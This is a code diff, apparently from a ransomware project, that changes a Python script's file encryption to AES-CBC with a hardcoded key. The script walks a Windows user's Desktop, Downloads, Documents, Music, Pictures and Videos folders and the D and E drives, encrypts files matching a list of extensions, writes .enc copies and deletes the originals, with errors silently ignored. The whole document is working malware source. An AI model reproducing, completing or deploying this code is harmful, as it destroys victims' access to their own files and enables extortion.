@@ -29,19 +29,43 @@ global appdata
 appdata = os.getenv('APPDATA')
 
 
-def password(passwd):
-    
-    password = passwd.encode() 
-    salt = b'salt_' 
-    kdf = PBKDF2HMAC(
-    algorithm=hashes.SHA256(),
-    length=32,
-    salt=salt,
-    iterations=100000,
-    backend=default_backend()
-            )
-    k = base64.urlsafe_b64encode(kdf.derive(password))
-    return k
+############? NEW ENCRYPTION METHOD ############
+import os
+from Crypto import Random
+from Crypto.Cipher import AES
+from os import urandom
+
+
+
+def pad(s):
+    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)
+
+
+def encrypt(message, key, key_size=256):
+    try:
+        message = pad(message)
+        iv = Random.new().read(AES.block_size)
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        return iv + cipher.encrypt(message)
+    except:
+        pass
+
+
+def encrypt_file(file_name, key):
+    try:
+        with open(file_name, 'rb') as fo:
+            plaintext = fo.read()
+        enc = encrypt(plaintext, key)
+        with open(file_name + ".enc", 'wb') as fo:
+            fo.write(enc)
+        os.remove(file_name)
+    except:
+        pass
+
+
+key = b'\xe0\xce"\xa0E\xbbg\xf1\xe3P\x15\xa2\'&ax'
+# encrypt_file('one.txt', key)
+############? NEW ENCRYPTION METHOD ############
 
 def enc_fun(key,file):
     try:
@@ -205,20 +229,17 @@ def C_drive_desktop():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                                import threading
-                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
-                                x.start()
-                                x.join()
+                                encrypt_file(file_input, key)
             else:
-                enc_fun(password(passwd),file_input)
+                pass
 
-            finshed = True
+
             lol = 'Desktop Folder : '
-            PASSWORDS.append(f"{lol}{passwd}")
+            PASSWORDS.append(f"{lol}")
         else:
-            shit = 420
+            pass
     else:
-        shit = 420
+        pass
 
 def C_drive_downloads():
     userdir = f'C:\\Users\\{os.getlogin()}\\Downloads'
@@ -279,20 +300,17 @@ def C_drive_downloads():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                                import threading
-                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
-                                x.start()
-                                x.join()
+                                encrypt_file(file_input, key)
             else:
-                enc_fun(password(passwd),file_input)
+                pass
 
-            finshed = True
+
             lol = 'Downloads Folder : '
-            PASSWORDS.append(f"{lol}{passwd}")
+            PASSWORDS.append(f"{lol}")
         else:
-            shit = 420
+            pass
     else:
-        shit = 420
+        pass
 
 def C_drive_documents():
     userdir = f'C:\\Users\\{os.getlogin()}\\Documents'
@@ -353,20 +371,17 @@ def C_drive_documents():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                                import threading
-                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
-                                x.start()
-                                x.join()
+                                encrypt_file(file_input, key)
             else:
-                enc_fun(password(passwd),file_input)
+                pass
 
-            finshed = True
+
             lol = 'Documents Folder : '
-            PASSWORDS.append(f"{lol}{passwd}")
+            PASSWORDS.append(f"{lol}")
         else:
-            shit = 420
+            pass
     else:
-        shit = 420
+        pass
 
 def C_drive_music():
     userdir = f'C:\\Users\\{os.getlogin()}\\Music'
@@ -427,20 +442,17 @@ def C_drive_music():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                                import threading
-                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
-                                x.start()
-                                x.join()
+                                encrypt_file(file_input, key)
             else:
-                enc_fun(password(passwd),file_input)
+                pass
 
-            finshed = True
+
             lol = 'Music Folder : '
-            PASSWORDS.append(f"{lol}{passwd}")
+            PASSWORDS.append(f"{lol}")
         else:
-            shit = 420
+            pass
     else:
-        shit = 420
+        pass
 
 def C_drive_pictures():
     userdir = f'C:\\Users\\{os.getlogin()}\\Pictures'
@@ -501,20 +513,17 @@ def C_drive_pictures():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                                import threading
-                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
-                                x.start()
-                                x.join()
+                                encrypt_file(file_input, key)
             else:
-                enc_fun(password(passwd),file_input)
+                pass
 
-            finshed = True
+
             lol = 'Pictures Folder : '
-            PASSWORDS.append(f"{lol}{passwd}")
+            PASSWORDS.append(f"{lol}")
         else:
-            shit = 420
+            pass
     else:
-        shit = 420
+        pass
 
 def C_drive_videos():
     userdir = f'C:\\Users\\{os.getlogin()}\\Videos'
@@ -575,20 +584,17 @@ def C_drive_videos():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                                import threading
-                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
-                                x.start()
-                                x.join()
+                                encrypt_file(file_input, key)
             else:
-                enc_fun(password(passwd),file_input)
+                pass
 
-            finshed = True
+
             lol = 'Videos Folder : '
-            PASSWORDS.append(f"{lol}{passwd}")
+            PASSWORDS.append(f"{lol}")
         else:
-            shit = 420
+            pass
     else:
-        shit = 420
+        pass
 
 # Other Drives
 def D_drive():
@@ -650,20 +656,17 @@ def D_drive():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                                import threading
-                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
-                                x.start()
-                                x.join()
+                                encrypt_file(file_input, key)
             else:
-                enc_fun(password(passwd),file_input)
+                pass
 
-            finshed = True
+
             lol = 'D Drive : '
-            PASSWORDS.append(f"{lol}{passwd}")
+            PASSWORDS.append(f"{lol}")
         else:
-            shit = 420
+            pass
     else:
-        shit = 420
+        pass
 
 def E_drive():
     userdir = f'E:\\'
@@ -724,20 +727,17 @@ def E_drive():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                                import threading
-                                x= threading.Thread(target=enc_fun,args=(password(passwd),l))
-                                x.start()
-                                x.join()
+                                encrypt_file(file_input, key)
             else:
-                enc_fun(password(passwd),file_input)
+                pass
 
-            finshed = True
+
             lol = 'E Drive : '
-            PASSWORDS.append(f"{lol}{passwd}")
+            PASSWORDS.append(f"{lol}")
         else:
-            shit = 420
+            pass
     else:
-        shit = 420
+        pass
 
 a = Thread(target = C_drive_desktop)
 b = Thread(target = C_drive_downloads)
